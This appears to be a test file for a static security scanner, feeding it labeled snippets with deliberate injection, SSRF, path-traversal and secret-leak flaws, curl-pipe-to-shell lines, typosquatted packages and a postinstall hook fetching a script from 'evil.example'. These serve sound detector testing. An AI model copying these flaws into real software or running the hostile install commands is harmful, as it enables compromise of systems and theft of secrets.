"""Labeled detection and dependency tests for appsec-static-audit.

Each case is a tiny repository written to a temp dir, scanned with scripts/audit.py, and judged on which rules fired.
`must` rules have to appear (true positives); `must_not` rules must NOT appear (false-positive guards).

Run:  python3 tests/appsec-static-audit/test_detection.py      (prints a TP/FP table)
      python3 -m pytest tests/appsec-static-audit/test_detection.py
"""
import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
SKILL = os.path.abspath(os.path.join(HERE, "..", "..", "skills", "appsec-static-audit"))
AUDIT = os.path.join(SKILL, "scripts", "audit.py")
sys.path.insert(0, os.path.join(SKILL, "scripts"))
import deps  # noqa: E402


def scan(files, extra=()):
    with tempfile.TemporaryDirectory(prefix="appsec-det-") as tmp:
        repo = os.path.join(tmp, "repo")
        for rel, content in files.items():
            p = os.path.join(repo, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            with open(p, "w", encoding="utf-8") as fh:
                fh.write(content)
        out = os.path.join(tmp, "out")
        r = subprocess.run([sys.executable, "-I", AUDIT, repo, "--out", out, "--no-git-history", *extra], capture_output=True, text=True)
        assert r.returncode == 0, r.stdout + r.stderr
        with open(os.path.join(out, "scan.json"), encoding="utf-8") as fh:
            return json.load(fh)


def rules(scan_json, file=None):
    """Rule ids that fired. `flow:<rule>` marks findings produced by the data-flow engine (not just a regex match)."""
    out = set()
    for f in scan_json["findings"]:
        if file is None or f["file"] == file:
            out.add(f["rule"])
            if "Data flow:" in f.get("detail", ""):
                out.add("flow:" + f["rule"])
    return out


# name -> (files, must, must_not)
CASES = {
    # ---------------- Python: multi-line statements and data flow
    "py-multiline-sql-concat": ({"a.py": 'from flask import request\ndef f():\n    cur.execute(\n        "SELECT * FROM t WHERE id=" + request.args["id"]\n    )\n'},
                                {"INJ-SQL-1"}, set()),
    "py-var-flow-sql": ({"a.py": 'from flask import request\ndef f():\n    n = request.args["n"]\n    q = "SELECT * FROM t WHERE n=\'%s\'" % n\n    cur.execute(q)\n'},
                        {"INJ-SQL-1"}, set()),
    "py-var-flow-sql-fstring": ({"a.py": 'from flask import request\ndef f():\n    q = f"SELECT * FROM t WHERE n={request.form[\'n\']}"\n    conn.execute(q)\n'},
                                {"INJ-SQL-1"}, set()),
    "py-var-flow-cmd": ({"a.py": 'import os\nfrom flask import request\ndef f():\n    host = request.args.get("h")\n    cmd = f"ping -c1 {host}"\n    os.system(cmd)\n'},
                        {"INJ-CMD-1"}, set()),
    "py-subprocess-shell-true": ({"a.py": 'import subprocess\nfrom flask import request\ndef f():\n    d = request.args["d"]\n    subprocess.run("ls " + d, shell=True)\n'},
                                 {"INJ-CMD-1"}, set()),
    "py-var-flow-ssrf": ({"a.py": 'import requests\nfrom flask import request\ndef f():\n    u = request.args["u"]\n    return requests.get(u).text\n'},
                         {"SSRF-1"}, set()),
    "py-var-flow-path": ({"a.py": 'from flask import request\ndef f():\n    name = request.args["file"]\n    return open("/data/" + name).read()\n'},
                         {"PATH-1"}, set()),
    "py-yaml-load-tainted": ({"a.py": 'import yaml\nfrom flask import request\ndef f():\n    return yaml.load(request.data)\n'},
                             {"DESER-2"}, set()),
    "py-redirect-flow": ({"a.py": 'from flask import request, redirect\ndef f():\n    nxt = request.args.get("next")\n    return redirect(nxt)\n'},
                         {"REDIR-1"}, set()),
    # ---------------- Python: must NOT fire
    "py-parameterized-sql": ({"a.py": 'from flask import request\ndef f():\n    cur.execute("SELECT * FROM t WHERE id=%s", (request.args["id"],))\n'},
                             set(), {"INJ-SQL-1", "INJ-SQL-2"}),
    "py-int-sanitized-sql": ({"a.py": 'from flask import request\ndef f():\n    uid = int(request.args["id"])\n    cur.execute("SELECT * FROM t WHERE id=" + str(uid))\n'},
                             set(), {"flow:INJ-SQL-1"}),     # the regex may still list the concatenation; the flow engine must not claim tainted input
    "py-shlex-quote": ({"a.py": 'import os, shlex\nfrom flask import request\ndef f():\n    h = shlex.quote(request.args["h"])\n    os.system("ping " + h)\n'},
                       set(), {"flow:INJ-CMD-1"}),
    "py-subprocess-list": ({"a.py": 'import subprocess\nfrom flask import request\ndef f():\n    subprocess.run(["ls", request.args["d"]])\n'},
                           set(), {"flow:INJ-CMD-1"}),
    "py-secure-filename": ({"a.py": 'from flask import request\nfrom werkzeug.utils import secure_filename\ndef f():\n    n = secure_filename(request.args["file"])\n    return open("/data/" + n).read()\n'},
                           set(), {"PATH-1"}),
    "py-constant-url": ({"a.py": 'import requests\nfrom flask import request\ndef f():\n    q = request.args["q"]\n    return requests.get("https://api.example.com/search", params={"q": q}).text\n'},
                        set(), {"SSRF-1"}),
    "py-commented-out-sql": ({"a.py": '# cur.execute("SELECT * FROM t WHERE id=" + request.args["id"])\nx = 1\n'},
                             set(), {"INJ-SQL-1", "INJ-SQL-2"}),
    # ---------------- JavaScript
    "js-multiline-template-sql": ({"a.js": 'app.get("/x", (req, res) => {\n  db.query(\n    `SELECT * FROM t WHERE id = ${req.params.id}`\n  );\n});\n'},
                                   {"INJ-SQL-2"}, set()),
    "js-var-flow-sql": ({"a.js": 'app.get("/x", (req, res) => {\n  const id = req.query.id;\n  const q = "SELECT * FROM t WHERE id = " + id;\n  db.query(q);\n});\n'},
                        {"INJ-SQL-2"}, set()),
    "js-destructure-exec": ({"a.js": 'app.post("/x", (req, res) => {\n  const { host } = req.body;\n  exec(`ping -c1 ${host}`);\n});\n'},
                            {"INJ-CMD-2"}, set()),
    "js-redirect-flow": ({"a.js": 'app.get("/x", (req, res) => {\n  const next = req.query.next;\n  res.redirect(next);\n});\n'},
                         {"REDIR-1"}, set()),
    "js-idor-findbyid-var": ({"a.js": 'app.get("/d/:id", async (req, res) => {\n  const id = req.params.id;\n  const d = await Doc.findById(id);\n  res.json(d);\n});\n'},
                             {"ACC-1"}, {"INJ-NOSQL-1"}),
    "js-nosql-operator": ({"a.js": 'app.post("/login", async (req, res) => {\n  const { user } = req.body;\n  const u = await User.findOne({ username: user });\n});\n'},
                          {"INJ-NOSQL-1"}, set()),
    "js-reflected-html": ({"a.js": 'app.get("/hi", (req, res) => {\n  const name = req.query.name;\n  res.send("<h1>Hello " + name + "</h1>");\n});\n'},
                          {"XSS-4"}, set()),
    "js-parameterized-sql": ({"a.js": 'app.get("/x", (req, res) => {\n  const id = req.query.id;\n  db.query("SELECT * FROM t WHERE id = ?", [id]);\n});\n'},
                             set(), {"INJ-SQL-2"}),
    "js-parseint-sanitized": ({"a.js": 'app.get("/x", (req, res) => {\n  const id = parseInt(req.query.id, 10);\n  db.query("SELECT * FROM t WHERE id = " + id);\n});\n'},
                              set(), {"flow:INJ-SQL-2"}),
    "js-findbyid-not-nosql": ({"a.js": 'app.get("/d/:id", async (req, res) => { const d = await Doc.findById(req.params.id); res.json(d); });\n'},
                              set(), {"INJ-NOSQL-1"}),
    # ---------------- secret fallbacks
    "secret-js-env-fallback": ({"a.js": 'const secret = process.env.JWT_SECRET || "hardcodedSecretValue123";\n'}, {"SEC-DEFAULT-SECRET-IN-ENV-LOOKUP"}, set()),
    "secret-py-environ-default": ({"a.py": 'import os\nKEY = os.environ.get("API_KEY", "abcd1234efgh5678")\n'}, {"SEC-DEFAULT-SECRET-IN-ENV-LOOKUP"}, set()),
    "secret-py-getenv-default": ({"a.py": 'import os\nPASSWORD = os.getenv("DB_PASSWORD", "supersecretpass")\n'}, {"SEC-DEFAULT-SECRET-IN-ENV-LOOKUP"}, set()),
    "secret-ruby-env-fetch": ({"a.rb": 'SECRET = ENV.fetch("SECRET_KEY_BASE", "0123456789abcdef")\n'}, {"SEC-DEFAULT-SECRET-IN-ENV-LOOKUP"}, set()),
    "secret-php-getenv-default": ({"a.php": "<?php\n$token = getenv('API_TOKEN') ?: 'abcdefgh12345678';\n"}, {"SEC-DEFAULT-SECRET-IN-ENV-LOOKUP"}, set()),
    "secret-env-no-default": ({"a.js": 'const secret = process.env.JWT_SECRET;\nconst k = process.env.API_KEY;\n'}, set(), {"SEC-DEFAULT-SECRET-IN-ENV-LOOKUP", "SEC-HARDCODED-CREDENTIAL-LITERAL"}),
    "secret-nonsecret-default": ({"a.py": 'import os\nPORT = os.environ.get("PORT", "8080")\nHOST = os.getenv("DB_HOST", "localhost")\n'}, set(), {"SEC-DEFAULT-SECRET-IN-ENV-LOOKUP"}),
    "secret-empty-default": ({"a.py": 'import os\nPASSWORD = os.getenv("DB_PASSWORD", "")\nTOKEN = os.getenv("TOKEN", None)\n'}, set(), {"SEC-DEFAULT-SECRET-IN-ENV-LOOKUP"}),
    # ---------------- other stacks
    "go-sql-sprintf": ({"a.go": 'package main\nfunc f(r *http.Request) {\n\tdb.Query(fmt.Sprintf("SELECT * FROM t WHERE id=%s", r.FormValue("id")))\n}\n'}, {"INJ-SQL-4"}, set()),
    "go-sql-bound": ({"a.go": 'package main\nfunc f(r *http.Request) {\n\tdb.Query("SELECT * FROM t WHERE id=$1", r.FormValue("id"))\n}\n'}, set(), {"INJ-SQL-4", "INJ-SQL-2"}),
    "go-ssrf": ({"a.go": 'package main\nfunc f(r *http.Request) {\n\thttp.Get(r.FormValue("u"))\n}\n'}, {"SSRF-2"}, set()),
    "go-cmd": ({"a.go": 'package main\nfunc f(r *http.Request) {\n\texec.Command("ls", r.FormValue("d"))\n}\n'}, {"INJ-CMD-6"}, set()),
    "ruby-sql-interp": ({"a.rb": 'def f\n  User.where("name = \'#{params[:n]}\'")\nend\n'}, {"INJ-SQL-4"}, set()),
    "ruby-sql-bound": ({"a.rb": 'def f\n  User.where("name = ?", params[:n])\nend\n'}, set(), {"INJ-SQL-4"}),
    "ruby-yaml-load": ({"a.rb": 'def f\n  YAML.load(params[:y])\nend\n'}, {"DESER-3"}, set()),
    "cs-sqlcommand-concat": ({"a.cs": 'class A { void F(string id) { var c = new SqlCommand("SELECT * FROM t WHERE id=" + id, conn); } }\n'}, {"INJ-SQL-4"}, set()),
    "gha-env-indirection-is-safe": ({".github/workflows/ci.yml": "on: pull_request\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: echo \"$TITLE\"\n"},
                                    set(), {"CI-1", "CI-3", "CI-4", "CI-5", "CI-2"}),
    "gha-pinned-sha-is-safe": ({".github/workflows/ci.yml": "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ok-org/pinned@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2\n"},
                               set(), {"CI-3"}),
    "docker-user-not-first-line": ({"Dockerfile": "FROM alpine:3.19\nRUN adduser -D app\nUSER app\nCMD [\"sh\"]\n"}, set(), {"DKR-3"}),
    "docker-no-user": ({"Dockerfile": "FROM alpine:3.19\nCMD [\"sh\"]\n"}, {"DKR-3"}, set()),
    "k8s-hardened-workload": ({"d.yaml": "apiVersion: apps/v1\nkind: Deployment\nspec:\n  template:\n    spec:\n      securityContext:\n        runAsNonRoot: true\n      containers:\n        - name: a\n          image: nginx@sha256:abc\n          resources:\n            limits:\n              cpu: \"1\"\n"},
                              set(), {"K8S-3", "K8S-4", "K8S-1"}),
    # ---------------- route parameters are untrusted input (FastAPI / Flask handlers)
    "fastapi-path-param-ssrf": ({"a.py": 'import requests\n@vector.post("/html/{uuid}/{url:path}")\ndef upload_html(uuid: str, url: str):\n    r = requests.get(url, timeout=10)\n    return r.text\n'},
                                {"flow:SSRF-1"}, set()),
    "fastapi-query-param-sql": ({"a.py": '@router.get("/s")\ndef s(q: str = Query(None), db=Depends(get_db)):\n    db.execute("SELECT * FROM t WHERE n=" + q)\n'}, {"flow:INJ-SQL-1"}, set()),
    "fastapi-int-param-is-safe": ({"a.py": '@app.get("/i/{item_id}")\ndef g(item_id: int):\n    cur.execute("SELECT * FROM t WHERE id=" + str(item_id))\n'}, set(), {"flow:INJ-SQL-1"}),
    "fastapi-depends-param-is-safe": ({"a.py": '@app.get("/x")\ndef g(conn=Depends(get_conn)):\n    conn.execute("SELECT 1")\n    requests.get(conn)\n'}, set(), {"flow:SSRF-1", "flow:INJ-SQL-1"}),
    "flask-path-param-file": ({"a.py": '@app.route("/f/<name>")\ndef f(name):\n    return open("/data/" + name).read()\n'}, {"flow:PATH-1"}, set()),
    "flow-parameterized-tuples-are-safe": ({"a.py": '@vector.get("/c/{uuid}/{fn}")\ndef g(uuid: str, fn: str):\n    legacy = [("SELECT a FROM t WHERE u = %s", (uuid, fn)), ("SELECT b FROM t WHERE u = %s", (uuid, fn))]\n    for query, params in legacy:\n        cur.execute(query, params)\n'},
                                            set(), {"flow:INJ-SQL-1"}),
    "flow-tainted-query-in-tuples": ({"a.py": '@vector.get("/c/{uuid}")\ndef g(uuid: str):\n    for query, params in [("SELECT a FROM t WHERE u = \'" + uuid + "\'", ())]:\n        cur.execute(query, params)\n'}, {"flow:INJ-SQL-1"}, set()),
    "flow-validator-guard-clears-taint": ({"a.py": '@vector.get("/c/{uuid}")\ndef g(uuid: str):\n    if not validate_uuid(uuid):\n        raise HTTPException(400)\n    return open("/data/" + uuid).read()\n'}, set(), {"flow:PATH-1"}),
    "flow-unvalidated-path-param": ({"a.py": '@vector.post("/p/{uuid}/{fn}")\ndef p(uuid: str, fn: str):\n    path = os.path.join(DATA, "x", uuid, fn)\n    with open(path, "wb") as fh:\n        fh.write(b"")\n'}, {"flow:PATH-1"}, set()),
    "flow-guard-on-a-different-name": ({"a.py": '@vector.get("/c/{a}/{b}")\ndef g(a: str, b: str):\n    if not validate_uuid(a):\n        raise HTTPException(400)\n    return open("/data/" + b).read()\n'}, {"flow:PATH-1"}, set()),
    "plain-helper-param-is-not-input": ({"a.py": 'def helper(url):\n    return requests.get(url)\n'}, set(), {"flow:SSRF-1"}),
    # ---------------- shell scripts that execute what the network returns
    "sh-source-curl": ({"entry.sh": '#!/bin/sh\nsource <(curl -s "$VAULT_GET_ADDR/get_secret.sh")\n'}, {"SH-1"}, set()),
    "sh-curl-pipe-bash": ({"i.sh": 'curl -fsSL https://example.com/install.sh | sudo bash\n'}, {"SH-1"}, set()),
    "sh-eval-curl": ({"i.sh": 'eval "$(curl -s https://example.com/env)"\n'}, {"SH-1"}, set()),
    "sh-curl-to-file-is-not-flagged": ({"i.sh": 'curl -fsSLo /tmp/x.sh https://example.com/x.sh\nsha256sum -c x.sh.sha256\nsh /tmp/x.sh\n'}, set(), {"SH-1"}),
    "sh-curl-pipe-jq-is-safe": ({"i.sh": 'curl -s "$URL" | jq .name\n'}, set(), {"SH-1"}),
    # ---------------- noise reduction
    "dkr4-loopback-binding-is-safe": ({"docker-compose.yml": 'services:\n  r:\n    image: redis:7\n    ports:\n      - "127.0.0.1:6379:6379"\n'}, set(), {"DKR-4"}),
    "dkr4-all-interfaces": ({"docker-compose.yml": 'services:\n  r:\n    image: redis:7\n    ports:\n      - "6379:6379"\n'}, {"DKR-4"}, set()),
    "connstr-interpolation-forms-are-safe": ({"c.py": 'A = "postgresql://admin:$DB_PASSWORD@db/app"\nB = "postgresql://admin:$${DB_PASSWORD}@db/app"\nC = f"postgresql://admin:{pw}@db/app"\nD = "postgresql://admin:${PW}@db/app"\n'},
                                             set(), {"SEC-CREDENTIALS-IN-CONNECTION-ST"}),
    "connstr-literal-password": ({"c.py": 'A = "postgresql://admin:Sup3rS3cr3t@db/app"\n'}, {"SEC-CREDENTIALS-IN-CONNECTION-ST"}, set()),
    "fetch-credentials-include-is-not-a-secret": ({"a.js": "fetch('/api', { method: 'POST', credentials: 'include' });\n"}, set(), {"SEC-HARDCODED-CREDENTIAL-LITERAL"}),
    # ---------------- API-3 follows the route inventory
    "api3-custom-router-name": ({"a.py": 'from fastapi import APIRouter\ncodex = APIRouter()\n@codex.get("/tickets")\ndef tickets():\n    return []\n'}, {"API-3"}, set()),
    "api3-health-only-is-public": ({"a.py": 'from fastapi import FastAPI\napp = FastAPI()\n@app.get("/health")\ndef health():\n    return {"ok": True}\n'}, set(), {"API-3"}),
    "api3-auth-dependency-counts": ({"a.py": '@app.get("/me")\ndef me(user=Depends(get_current_user)):\n    return user\n'}, set(), {"API-3"}),
    "api3-db-dependency-is-not-auth": ({"a.py": '@app.get("/rows")\ndef rows(db=Depends(get_db)):\n    return db.all()\n'}, {"API-3"}, set()),
    "api3-api-key-env-is-not-auth": ({"a.py": 'import os\nOPENAI_API_KEY = os.getenv("OPENAI_API_KEY")\n@app.get("/rows")\ndef rows():\n    return []\n'}, {"API-3"}, set()),
    "php-ssrf": ({"a.php": "<?php\n$x = file_get_contents($_GET['u']);\n"}, {"SSRF-2"}, set()),
}


def run_cases():
    rows, failures = [], []
    for name, (files, must, must_not) in CASES.items():
        got = rules(scan(files))
        missing, extra = must - got, must_not & got
        rows.append((name, not missing and not extra, sorted(missing), sorted(extra)))
        if missing or extra:
            failures.append(f"{name}: missing={sorted(missing)} unexpected={sorted(extra)} got={sorted(got)}")
    return rows, failures


def test_labeled_detection_cases():
    rows, failures = run_cases()
    assert not failures, "\n" + "\n".join(failures)


def test_blind_spots_are_reported():
    s = scan({"a.py": '# cur.execute("SELECT " + request.args["x"])\nx = 1\n', "static/app.min.js": "var a=1;", "bundle.js": "var x='" + "a" * 3000 + "';\n"})
    text = " ".join(s["limitations"])
    assert "commented-out code" in text and "minified" in text and "Over-long lines" in text
    assert s["inventory"]["not_scanned"]["commented_rule_matches"] >= 1


def test_python_syntax_error_is_reported_not_fatal():
    s = scan({"a.py": "def broken(:\n    request.args\n"})
    assert any("could not be parsed" in l for l in s["limitations"])


# ------------------------------------------------------------------ dependencies
def test_version_comparison():
    lt = [("1.2.3", "1.10.0"), ("1.0.0rc1", "1.0.0"), ("2.0.0-beta.2", "2.0.0-beta.10"), ("4.17.20", "4.17.21"), ("5.4", "5.4.1"), ("1.0.0a1", "1.0.0b1")]
    for a, b in lt:
        assert deps.vcmp(a, b) < 0, (a, b)
        assert deps.vcmp(b, a) > 0, (b, a)
    assert deps.vcmp("1.0", "1.0.0") == 0 and deps.vcmp("v2.1.0", "2.1.0") == 0
    assert deps.vcmp("1.0.0.post1", "1.0.0") > 0


def test_snapshot_matches_known_vulnerable_versions():
    db = deps.load_db()
    assert db and db["ecosystems"], "advisory snapshot missing"
    known = [("npm", "jsonwebtoken", "8.5.1"), ("pypi", "PyYAML", "5.3"), ("maven", "org.apache.logging.log4j:log4j-core", "2.14.1"),
             ("golang", "golang.org/x/net", "0.10.0"), ("nuget", "Newtonsoft.Json", "12.0.1"), ("pypi", "django", "3.2.0"), ("cargo", "time", "0.1.43")]
    for eco, name, ver in known:
        assert deps.db_matches(db, eco, name, ver), (eco, name, ver)
    for eco, name, ver in [("npm", "jsonwebtoken", "9.0.2"), ("pypi", "pyyaml", "6.0.2")]:
        assert not [m for m in deps.db_matches(db, eco, name, ver) if any(i.startswith("CVE-2022-2") or i.startswith("CVE-2020") for i in m["ids"])], (eco, name, ver)
    ll = [m for m in deps.db_matches(db, "maven", "org.apache.logging.log4j:log4j-core", "2.14.1") if "CVE-2021-44228" in m["ids"]]
    assert ll and ll[0]["severity"] == "Critical"


def test_dep_finding_groups_advisories_and_names_fix():
    s = scan({"requirements.txt": "pyyaml==5.3\nflask==1.1.2\n"})
    dep1 = [f for f in s["findings"] if f["rule"] == "DEP-1"]
    assert {f["title"].split(":")[1].split()[0] for f in dep1} == {"pyyaml", "flask"}
    y = next(f for f in dep1 if "pyyaml" in f["title"])
    assert "Upgrade pyyaml to >=" in y["fix"] and y["severity"] == "Critical"


def test_exact_npm_pin_is_matched_but_range_is_unresolved():
    s = scan({"package.json": json.dumps({"dependencies": {"jsonwebtoken": "8.5.1", "express": "^4.0.0"}})})
    assert any(f["rule"] == "DEP-1" and "jsonwebtoken" in f["title"] for f in s["findings"])
    assert s["dependencies"]["unresolved"] == 1
    assert any("no exact resolved version" in l for l in s["limitations"])


def test_lockfile_direct_vs_transitive_and_dev_downgrade():
    lock = {"lockfileVersion": 3, "packages": {
        "": {"dependencies": {"jsonwebtoken": "^8.5.1"}, "devDependencies": {"lodash": "^4.17.0"}},
        "node_modules/jsonwebtoken": {"version": "8.5.1", "resolved": "https://registry.npmjs.org/jsonwebtoken/-/jsonwebtoken-8.5.1.tgz", "integrity": "sha512-x"},
        "node_modules/lodash": {"version": "4.17.15", "dev": True, "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.15.tgz", "integrity": "sha512-y"},
        "node_modules/jsonwebtoken/node_modules/semver": {"version": "5.0.0", "resolved": "https://registry.npmjs.org/semver/-/semver-5.0.0.tgz", "integrity": "sha512-z"}}}
    pkg = {"dependencies": {"jsonwebtoken": "^8.5.1"}, "devDependencies": {"lodash": "^4.17.0"}}
    s = scan({"package.json": json.dumps(pkg), "package-lock.json": json.dumps(lock)})
    eco = s["dependencies"]["ecosystems"]["npm"]
    assert eco["total"] == 3 and eco["from_lockfile"] == 3 and eco["transitive"] >= 1 and eco["direct"] >= 2
    assert not any(f["rule"] == "DEP-4" for f in s["findings"])
    lod = next(f for f in s["findings"] if f["rule"] == "DEP-1" and "lodash" in f["title"])
    assert "dev-only" in lod["detail"]
    assert s["dependencies"]["unresolved"] == 0


def test_more_lockfile_formats_are_parsed():
    files = {
        "go.mod": "module x\n\nrequire golang.org/x/net v0.10.0\n",
        "go.sum": "golang.org/x/net v0.10.0 h1:abc=\ngolang.org/x/net v0.10.0/go.mod h1:def=\n",
        "uv.lock": '[[package]]\nname = "pyyaml"\nversion = "5.3"\nsource = { registry = "https://pypi.org/simple" }\n',
        "Cargo.toml": '[package]\nname="x"\n[dependencies]\ntime = "0.1"\n',
        "Cargo.lock": '[[package]]\nname = "time"\nversion = "0.1.43"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\n',
        "web/pnpm-lock.yaml": "lockfileVersion: '6.0'\npackages:\n  /jsonwebtoken@8.5.1:\n    resolution: {integrity: sha512-x}\n",
    }
    s = scan(files)
    titles = " ".join(f["title"] for f in s["findings"] if f["rule"] == "DEP-1")
    for needle in ("golang.org/x/net 0.10.0", "pyyaml 5.3", "time 0.1.43", "jsonwebtoken 8.5.1"):
        assert needle in titles, (needle, titles)


def test_missing_lockfile_detected_for_other_ecosystems():
    s = scan({"Cargo.toml": '[package]\nname="x"\n[dependencies]\nserde = "1"\n', "pyproject.toml": '[project]\nname="x"\ndependencies = ["requests>=2"]\n',
              "tooling/pyproject.toml": "[tool.black]\nline-length = 100\n"})
    dep4 = {f["file"] for f in s["findings"] if f["rule"] == "DEP-4"}
    assert dep4 == {"Cargo.toml", "pyproject.toml"}, dep4


def test_supply_chain_checks():
    files = {
        "package.json": json.dumps({"dependencies": {"expresss": "1.0.0", "lodash": "4.17.21"}, "scripts": {"postinstall": "curl -s http://evil.example/x.sh | sh", "test": "jest"}}),
        "package-lock.json": json.dumps({"lockfileVersion": 3, "packages": {"node_modules/a": {"version": "1.0.0", "resolved": "http://registry.example.com/a.tgz"}}}),
        "requirements.txt": "--extra-index-url https://pypi.internal.example/simple\nreqeusts==2.0.0\n",
        ".npmrc": "strict-ssl=false\nregistry=http://registry.example.com/\n",
    }
    s = scan(files)
    got = {f["rule"] for f in s["findings"]}
    assert {"DEP-5", "DEP-6", "DEP-7", "DEP-8"} <= got, got
    sq = {f["title"] for f in s["findings"] if f["rule"] == "DEP-5"}
    assert any("expresss" in t for t in sq) and any("reqeusts" in t for t in sq)
    assert not any("lodash" in t for t in sq)


def test_no_false_typosquat_for_popular_or_scoped():
    s = scan({"package.json": json.dumps({"dependencies": {"react": "18.2.0", "@types/node": "20.0.0", "express": "4.18.2", "uuid": "9.0.0"}})})
    assert not [f for f in s["findings"] if f["rule"] == "DEP-5"]


def test_stale_or_missing_snapshot_is_loud():
    s = scan({"requirements.txt": "flask==1.1.2\n"}, extra=("--advisory-db", "/nonexistent/db.json.gz"))
    assert any("PARTIAL" in l for l in s["limitations"]), s["limitations"]
    assert s["dependencies"]["advisory_db"]["available"] is False


def test_osv_import_merges_without_duplicates():
    with tempfile.TemporaryDirectory() as tmp:
        osv = os.path.join(tmp, "osv.json")
        json.dump({"results": [{"source": {"path": "requirements.txt"}, "packages": [{"package": {"name": "flask", "version": "1.1.2", "ecosystem": "PyPI"},
                   "vulnerabilities": [{"id": "GHSA-m2qf-hxjv-5gpq", "aliases": ["CVE-2023-30861"], "summary": "Flask session leak",
                                        "database_specific": {"severity": "HIGH"}, "affected": [{"ranges": [{"events": [{"introduced": "0"}, {"fixed": "2.2.5"}]}]}]},
                                       {"id": "GHSA-new-0000-0000", "aliases": [], "summary": "brand new advisory", "database_specific": {"severity": "CRITICAL"}}]}]}]}, open(osv, "w"))
        s = scan({"requirements.txt": "flask==1.1.2\n"}, extra=("--osv-results", osv))
    flask = [f for f in s["findings"] if f["rule"] == "DEP-1" and "flask" in f["title"]]
    assert len(flask) == 1, [f["title"] for f in flask]
    assert flask[0]["severity"] == "Critical" and "GHSA-new-0000-0000" in flask[0]["detail"]


def test_http_prefixed_package_names_are_not_urls():
    s = scan({"requirements.txt": "httpx\nhttp-parser>=0.9\nrequests==2.32.3\n"})
    dep3 = [f for f in s["findings"] if f["rule"] == "DEP-3"]
    assert dep3, "unpinned httpx should be reported"
    locs = {l["snippet"] for f in dep3 for l in f["locations"]}
    assert "httpx" in locs and not any("httpx httpx" in x for x in locs), locs
    assert s["dependencies"]["ecosystems"]["pypi"]["total"] == 3


def test_dependency_evidence_is_the_real_source_line():
    s = scan({"requirements.txt": "pyyaml==5.3\nflask\n", "package.json": json.dumps({"dependencies": {"jsonwebtoken": "8.5.1"}}, indent=2)})
    by = {(f["rule"], f["file"]): f for f in s["findings"]}
    assert by[("DEP-1", "requirements.txt")]["locations"][0]["snippet"] == "pyyaml==5.3" and by[("DEP-1", "requirements.txt")]["locations"][0]["line"] == 1
    assert by[("DEP-3", "requirements.txt")]["locations"][0]["snippet"] == "flask"
    jw = next(f for f in s["findings"] if f["rule"] == "DEP-1" and "jsonwebtoken" in f["title"])
    assert jw["locations"][0]["snippet"] == '"jsonwebtoken": "8.5.1"' and jw["locations"][0]["line"] == 3


def test_low_confidence_candidates_are_capped_at_medium():
    s = scan({"l.py": 'logger.info(f"body {request.json}")\n'})
    f = next(x for x in s["findings"] if x["rule"] == "DATA-3")
    assert f["severity"] == "Medium" and f["severity_scanner"] == "High" and "capped at Medium" in f["detail"]
    hi = scan({"a.py": 'import os\nos.system("ls " + x)\n'})
    assert next(x for x in hi["findings"] if x["rule"] == "INJ-CMD-1")["severity"] == "Critical"     # high-confidence rules keep their severity


def test_history_scan_ignores_docs_and_interpolation_and_downgrades_tests():
    with tempfile.TemporaryDirectory(prefix="appsec-hist-") as tmp:
        repo, out = os.path.join(tmp, "repo"), os.path.join(tmp, "out")
        files = {"docs/guide.md": 'Use a placeholder like `password = "changeme123"` and fetch(url, { credentials: \'include\' }).\n',
                 "compose.yml": 'DB: "postgresql://admin:$${DB_PASSWORD}@db/app"\nOTHER: "postgresql://admin:$DB_PASSWORD@db/app"\n',
                 "app/real.py": 'STRIPE = "sk_live_' + "a1B2c3D4e5F6g7H8i9J0k1L2" + '"\n',
                 "tests/fixture.py": 'KEY = "sk_live_' + "Z9y8X7w6V5u4T3s2R1q0P9o8" + '"\n'}

        def commit(msg):
            for cmd in (["add", "-A"], ["commit", "-qm", msg]):
                subprocess.run(["git", "-C", repo, "-c", "user.email=t@t", "-c", "user.name=t", *cmd], check=True, capture_output=True)
        write_files(repo, files)
        subprocess.run(["git", "-C", repo, "init", "-q"], check=True, capture_output=True)
        commit("add")
        write_files(repo, {rel: "# cleaned\n" for rel in files})          # overwrite: the old lines stay in history
        commit("clean")
        subprocess.run([sys.executable, "-I", AUDIT, repo, "--out", out], check=True, capture_output=True)
        s = json.load(open(os.path.join(out, "scan.json")))
    hist = {f["file"]: f for f in s["findings"] if f["rule"] == "SEC-HIST-1"}
    assert "docs/guide.md" not in hist and "compose.yml" not in hist, list(hist)
    assert hist["app/real.py"]["severity"] == "Critical"
    assert hist["tests/fixture.py"]["severity"] == "High", "a key in test code is reported one level lower"


def write_files(repo, files):
    for rel, content in files.items():
        p = os.path.join(repo, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(content)


if __name__ == "__main__":
    rows, failures = run_cases()
    w = max(len(r[0]) for r in rows)
    for name, ok, missing, extra in rows:
        print(f"{'PASS' if ok else 'FAIL'}  {name:<{w}}  {'missing ' + str(missing) if missing else ''}{' unexpected ' + str(extra) if extra else ''}")
    tp = sum(1 for n, (f, m, mn) in CASES.items() if m)
    print(f"\n{len(rows) - len(failures)}/{len(rows)} labeled detection cases passed ({tp} positive, {len(CASES) - tp} negative-only)")
    other = [(n, f) for n, f in globals().items() if n.startswith("test_") and callable(f) and n != "test_labeled_detection_cases"]
    bad = 0
    for n, f in other:
        try:
            f()
            print(f"PASS  {n}")
        except AssertionError as e:
            bad += 1
            print(f"FAIL  {n}: {e}")
    sys.exit(1 if failures or bad else 0)
